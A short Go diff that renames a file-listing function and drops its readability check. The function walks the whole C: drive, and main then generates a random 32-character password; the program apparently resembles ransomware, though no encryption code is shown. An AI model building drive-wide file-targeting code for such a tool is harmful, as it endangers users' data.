@@ -16,7 +16,7 @@ import (
 )
 
 func main() {
-	var allfiles []string = ListAll("C:\\")
+	var allfiles []string = ListAllfiles("C:\\")
 	passwd, err := keys.Generate(32, 10, 10, false, false)
 	if err != nil {
 		panic(err)
@@ -58,20 +58,13 @@ func main() {
 
 	w.ShowAndRun()
 }
-func ListAll(path string) (paths []string) {
+func ListAllfiles(path string) (paths []string) {
 	filepath.Walk(path, func(fullpath string, info os.FileInfo, err error) error {
 		if err != nil {
 			return filepath.SkipDir
 		}
 		if !info.IsDir() {
-			var flag bool = true
-			_, err := os.ReadFile(fullpath)
-			if err != nil {
-				flag = false
-			}
-			if flag {
-				paths = append(paths, fullpath)
-			}
+			paths = append(paths, fullpath)
 		}
 		return nil
 	})
